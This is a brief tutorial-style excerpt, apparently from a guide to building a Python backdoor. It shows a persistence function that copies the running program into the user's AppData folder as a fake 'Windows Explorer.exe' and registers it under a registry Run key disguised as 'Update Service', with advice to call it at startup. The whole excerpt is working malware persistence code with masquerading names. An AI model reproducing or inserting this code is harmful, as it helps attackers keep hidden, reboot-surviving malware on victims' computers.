# In code it can look likes this:
<pre>
<code>
def become_persistent(self):
    evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
    if not os.path.exists(evil_file_location):
        shutil.copyfile(sys.executable , evil_file_location)
        subprocess.call(f'REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update Service /t REG_SZ /d "{evil_file_location}"')
</code>
</pre>
* We need to call this function in __init__